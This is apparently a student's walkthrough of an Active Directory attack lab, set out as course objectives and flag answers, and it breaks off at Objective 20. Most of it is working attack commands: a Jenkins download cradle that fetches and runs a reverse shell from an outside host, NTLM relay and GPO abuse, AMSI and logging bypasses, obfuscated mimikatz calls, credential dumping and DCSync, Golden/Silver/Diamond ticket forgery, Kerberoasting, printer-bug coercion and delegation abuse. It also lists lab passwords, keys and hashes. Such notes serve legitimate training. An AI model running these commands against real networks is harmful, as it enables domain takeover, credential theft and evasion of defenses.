- C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat


---
# Learning Objective 01
### Flag - SID of the member of the Enterprise Admins group
- To enumerate members of the Enterprise Admins group
```
Get-DomainGroupMember -Identity "Enterprise Admins"
```
- Since, this is not a root domain, the above command will return nothing. We need to query the root domain as Enterprise Admins group is present only in the root of a forest.
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

#AD Module
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local
```


---


# Learning Objective - 2
### Flag - Display name of the GPO applied on StudentMachines OU
- Get GPO applied on an OU. Read GPO name from gplink attribute from Get-NetOU/Get-DomainOU
```
Get-DomainGPO -Identity "{7478F170-6A0C-490C-B355-9E4618BC785D}"
```


---


# Learning Objective - 3
### Flag - ActiveDirectory Rights for RDPUsers group on the users named ControlxUser
- On Bloodhound GUI you can get the answer

---


# Learning Objective 4
### Flag - Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```


---


# Learning Objective - 5	
### Flag - Service abused on the student VM for local privilege escalation
```
PS C:\Users\student603> . C:\AD\Tools\PowerUp.ps1
PS C:\Users\student603> Invoke-AllChecks
```
- Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.
```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```
- Local Privilege Escalation - PrivEscCheck
```
. C:\AD\Tools\PrivEscCheck.ps1
Invoke-PrivescCheck
```
### Flag - Script used for hunting for admin privileges using PowerShell Remoting
```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
```
winrs -r:dcorp-adminsrv cmd
```
### Flag - Jenkins user used to access Jenkins web console
- Login `builduser:builduser` on jenkins and go to `any Project->Configure->Build with-> Execute Windows Batch command`
```
powershell.exe iex (iwr http://172.16.100.3/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.3 -Port 443
```
- open hFS and start nc listener
```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```
- Build now on jenkins ( Also, make sure to add an exception or turn off the firewall on the student VM.)
### Flag - Domain user used for running Jenkins service on dcorp-ci
- check the username after getting shell



---


# Learning Objective - 6 **
### Flag - Name of the Group Policy attribute that is modified
- there is a directory `\\dcorp-ci\AI` that has a log file
- It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'. Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity.
- First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.
```
# run on wsl with sudo 'WSLToTh3Rescue!'

sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```
- On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location:
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.x' -UseDefaultCredentials"
```
- name the shortcut as `studentx.lnk` and copy the file 
```
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```
- After a minute we will receive call back on ntlmrelayz
- Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session:
```
nc 127.0.0.1 11000
```
- Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}:
```
# write_gpo_dacl student603 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

```
root@dcorp-std603:/mnt/c/AD/Tools/GPOddity# python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student603' --password 'GZHMLPwqc96BeAEU' --command 'net localgroup administra
tors student603 /add' --rogue-smbserver-ip '172.16.100.3' --rogue-smbserver-share 'std603-gp' --dc-ip '172.16.2.1' --smb
-mode none
```
- Leave GPOddity running and from another Ubuntu WSL session, create and share the stdx-gp directory:
```
mkdir /mnt/c/AD/Tools/stdx-gp
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```
- From a command prompt (Run as Administrator) on the student VM, run the following commands to allow 'Everyone' full permission on the stdx-gp share:
```
net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
```
- Verify if the gPCfileSysPath has been modified for the DevOps Policy. Run the following PowerView command:
```
Get-DomainGPO -Identity 'DevOps Policy'
```
- In 2 min you will have access via elevated cmd
```
winrs -r:dcorp-ci cmd /c "set computername && set username"
```


---


# Learning Objective - 7
### Flag - Process using svcadmin as service account
```
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```
- Sweet! There is a domain admin (svcadmin) session on dcorp-mgmt server! We do not have access to the server but that comes later.
**Enumeration using PowerView**
- We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
- First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged. We could also use these bypasses in the initial download-execute cradle that we used in Jenkins.
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx>iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
```
- Now let's download PowerView
```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))

Find-DomainUserLocation
```
- Found svcadmin (domain admin) session on dcorp-mgmt server.
**Use winrs to access dcorp-mgmt**
```
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```
- We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe on dcorp-mgmt
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx>iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe

echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

```
- Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx>$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```
- To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader. Run the following command on the reverse shell:
```
PS C:\Users\Administrator\.jenkins\workspace\Projectx>$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```
-  We got credentials of svcadmin - a domain administrator

```
PS C:\Users\Administrator\.jenkins\workspace\Project0>winrs -r:dcorp-mgmt cmd /c "tasklist /v"
```
### Flag - NTLM hash of svcadmin account	
- copy the rc4_hmac_nt
### Flag - We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc.
- credential vault

**Use OverPass-the-Hash to replay svcadmin credentials**
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- Try accessing the domain controller from the new process!
```
winrs -r:dcorp-dc cmd /c set username
```
### Flag - NTLM hash of srvadmin extracted from dcorp-adminsrv	
- login to dcorp-adminsrv
```
PS C:\Users\student603> Enter-PSSession -ComputerName dcorp-adminsrv
```
- not able to rum AMSI bypass, some errors, on checking there is `ConstrainedLanguage` 
```
$ExecutionContext.SessionState.LanguageMode
```
- Let's check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute:
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

#to check the policies of AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
- A default rule is enabled that allows everyone to run scripts from the C:\ProgramFiles folder!

**Create Invoke-MimiEx-keys-stdx.ps1**
- Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx-keys-stdx.ps1 (where x is your student ID).
- Open Invoke-MimiEx-keys-stdx.ps1 in PowerShell ISE (Right click on it and click Edit).
- Add the below encoded value for "sekurlsa::ekeys" to the end of the file.
```
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
Invoke-Mimi -Command $Pwn
```
- On student machine run the following command from a PowerShell session. Note that it will take several minutes for the copy process to complete.
```
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```
- on dcorp-adminsrv run the script
```
[dcorp-adminsrv]: PS C:\Program Files>**.\Invoke-MimiEx-keys-stdx.ps1
```
- Here we find the credentials of the dcorp-adminsrv$, appadmin and websvc users.

 **Create Invoke-MimiEx-vault-stdx.ps1**
 - Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx-vault-stdx.ps1 (where x is your student ID).
- Open Invoke-MimiEx-vault-stdx.ps1 in PowerShell ISE (Right click on it and click Edit).
- Replace "Invoke-Mimi -Command '"sekurlsa::ekeys"' " that we added earlier with "Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"' " (without quotes).
- Copy Invoke-MimiEx-vault-stdx.ps1 to dcorp-adminsrv and run it
```
Copy-Item C:\AD\Tools\Invoke-MimiEx-vault-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

```
[dcorp-adminsrv]: PS C:\Program Files> **.\Invoke-MimiEx-vault-stdx.ps1**
```
- We got credentials for the srvadmin user in clear-text


- according to walkthrough video NTLM for srvadmin should be there but in our case we didin;t found it so after getting cleartext we will convert it to NTLM hash and submit 
### Flag - NTLM hash of websvc extracted from dcorp-adminsrv	
- copy the hash from `.\Invoke-MimiEx-keys-stdx.ps1`
### Flag - NTLM hash of appadmin extracted from dcorp-adminsrv	
- copy the hash from `.\Invoke-MimiEx-keys-stdx.ps1`



---


# Learning Objective - 8
### Flag - NTLM hash of krbtgt
- Run the below command from an elevated command prompt (Run as administrator) to start a process with Domain Admin privileges:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```
- copy the krbtgt hash 
### Flag - NTLM hash of domain administrator - Administrator
- copy the Administrator  hash
- To get NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack. Run the below command from process running as Domain Admin on the student VM:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
**Forging Golden Ticket using Rubeus**
- run this on new cmd session
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```
- Now, use the generated command to forge a Golden ticket
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

```
#to check if the ticket is imported or not
klist

winrs -r:dcorp-dc cmd
set username
set computername
```


---


# Learning Objective - 9

#### Flag - The service whose Silver Ticket can be used for winrs or PowerShell Remoting
**HTTP Service**
- copy the DCORP-DC$ hash from dcsync attack and run below cmd
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:70666506174c29e0ee3b230d9a20f7e5 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
- to check if the ticket is imported or not
```
klist
```
- We have the HTTP service ticket for dcorp-dc, let's try accessing it using winrs. Note that we are using FQDN of dcorp-dc as that is what the service ticket has:
```
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
set username
set computername
```

**WMI Service**
- For accessing WMI, we need to create two tickets - one for HOST service and another for RPCSS. Run the below commands from an elevated shell:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:70666506174c29e0ee3b230d9a20f7e5 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
- Inject a ticket for RPCSS:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:70666506174c29e0ee3b230d9a20f7e5 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
- check the ticket via `klist`
- Now, try running WMI commands on the domain controller:
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```


---


# Learning Objective - 10

#### Flag - Name of the account who secrets are used for the Diamond Ticket attack
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- Access the DC using winrs from the new spawned process!
```
winrs -r:dcorp-dc cmd
set username
```


---


# Learning Objective - 11

#### Flag - Name of the Registry key modified to change Logon behavior of DSRM administrator
```
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- In the spawned process, run the following commands to copy Loader.exe to the DC and extract credentials from the SAM hive:
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```
- The DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC. We can do this as follows:
```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```
- Now on the student VM, we can use Pass-The-Hash (not OverPass-The-Hash) for the DSRM administrator:
```
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```
- From the new procees, we can now access dcorp-dc. Note that we are using PowerShell Remoting with IP address and Authentication - 'NegotiateWithImplicitCredential' as we are using NTLM authentication. So, we must modify TrustedHosts for the student VM. Run the below command from an elevated PowerShell session:
```
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```
- Now, run the commands below to access the DC:
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential

$env:username
```


---


# Learning Objective - 12

#### Flag - Attack that can be executed with Replication rights (no DA privileges required)
- We can check if studentx has replication rights using the following commands:
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerView.ps1

Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```
- If the studentx does not have replication rights, let's add the rights. Start a process as Domain Administrator by running the below command from an elevated command prompt:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- Run the below commands in the new process. Remember to change studentx to your user:
```
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat

. C:\AD\Tools\PowerView.ps1

Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
- Let's check for the rights once again from a normal shell:
```
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```
- Now we have the access. Now, below command (or any similar tool) can be used as studentx to get the hashes of krbtgt user or any other user.
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```


---


# Objective - 13

#### Flag - SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace. Flag value is the permissions string from (A;CI;Permissions String;;;SID)
- Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. Below command (to be run as Domain Administrator) modifies the host security descriptors for WMI on the DC to allow studentx access to WMI:
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```
- Now, we can execute WMI queries on the DC as studentx:
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```


---


# Objective - 14
#### Flag - SPN for which a TGS is requested	
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
```
- The svcadmin, which is a domain administrator has a SPN set! Let's Kerberoast it!
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
- we have the hash (remove :1433 and then run), we can crack the hash
```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```


---


# Objective - 15
#### Flag - Domain user who is a local admin on dcorp-appsrv	
- We first need to find a server that has unconstrained delegation enabled:
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```
- Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let's check if anyone of them have local admin privileges on dcorp-appsrv.
- First, we will try with appadmin. Run the below command from an elevated command prompt:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- Run the below commands in the new process:
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```
#### Flag - Which user's credentials are compromised by using the printer bug for compromising dollarcorp	
**Printer Bug - Execute Rubeus using Loader and winrs**
- Run the below command from the process running appadmin:
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```
- Run Rubeus in listener mode in the winrs session on dcorp-appsrv:
```
winrs -r:dcorp-appsrv cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
**Use the Printer Bug for Coercion**
- On the student VM, use MS-RPRN to force authentication from dcorp-dc$
```
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
- On the Rubeus listener, we can see the TGT of dcorp-dc$
- Copy the base64 encoded ticket and use it with Rubeus on student VM. Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx...
```
- Now, we can run DCSync from this process:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
**Escalation to Enterprise Admins**
- To get Enterprise Admin privileges, we need to force authentication from mcorp-dc. Run the below command to listern for mcorp-dc$ tickets on dcorp-appsrv:
```
winrs -r:dcorp-appsrv cmd

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```
- Use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv
```
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
- On the Rubeus listener, we can see the TGT of mcorp-dc$:
- As previously, copy the base64 encoded ticket and use it with Rubeus on student VM. Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx...
```
- Now, we can run DCSync from this process:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```


---


# Objective - 16
#### Flag - Value of msds-allowedtodelegate to attribute of dcorp-adminsrv

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -TrustedToAuth
```
**Abuse Constrained Delegation using websvc with Rubeus**
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```
- Check if the TGS is injected:
```
klist
```
- Try accessing filesystem on dcorp-mssql:
```
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```
#### Flag - Alternate service accessed on dcorp-dc by abusing Constrained delegation on dcorp-adminsrv	
- We have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```
- Run the below command to abuse the LDAP ticket:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```


---


# Objective - 17
#### Flag - Computer account on which ciadmin can configure Resource-based Constrained Delegation	
```
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```
- Recall that we compromised ciadmin from dcorp-ci. We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci.
- Let's use the reverse shell that we have and load PowerView there:
```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
iex (iwr http://172.16.100.X/sbloggingbypass.txt -UseBasicParsing)
S`eT-It`em *************** "sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1'))
```
- Now, set RBCD on dcorp-mgmt for the student VMs. You may like to set it for all the student VMs in your lab instance so that your fellow students can also try it:
```
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std603$' -Verbose

Get-DomainRBCD
```
- Get AES keys of your student VM (as we configured RBCD for it above). Run the below command from an elevated shell:
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```
- With Rubeus, abuse the RBCD to access dcorp-mgmt as Domain Administrator - Administrator:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std603$ /aes256:be29bb307e8dc4924bb07c6111b1ad48d6e741d5f765f75d30b1c6877cf13b9b /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```
- Check if we can access dcorp-mgmt:
```
winrs -r:dcorp-mgmt cmd
set username
set computername
```


---


# Objective - 18
#### Flag - SID history injected to escalate to Enterprise Admins	
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
**Forge ticket**
- Let's Forge a ticket with SID History of Enterprise Admins. Run the below command:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:aeff1ac635a40b8fc9a0efba3bec921d /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```
- Copy the base64 encoded ticket from above and use it in the following command:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
```
- Once the ticket is injected, we can access mcorp-dc!
```
winrs -r:mcorp-dc.moneycorp.local cmd
```


---


# Objective - 19
#### Flag - NTLM hash of krbtgt of moneycorp.local
- We already have the krbtgt hash from dcorp-dc. Let's create the inter-realm TGT and inject. Run the below command:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```
- We can now access mcorp-dc!
```
winrs -r:mcorp-dc.moneycorp.local cmd
set username
set computername
```
- We can also execute the DCSync attacks against moneycorp. Use the following command in the above prompt where we injected the ticket:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```


---


# Objective - 20
#### Flag - Service for which a TGS is requested from eurocorp-dc	
**Extract the trust key**
```
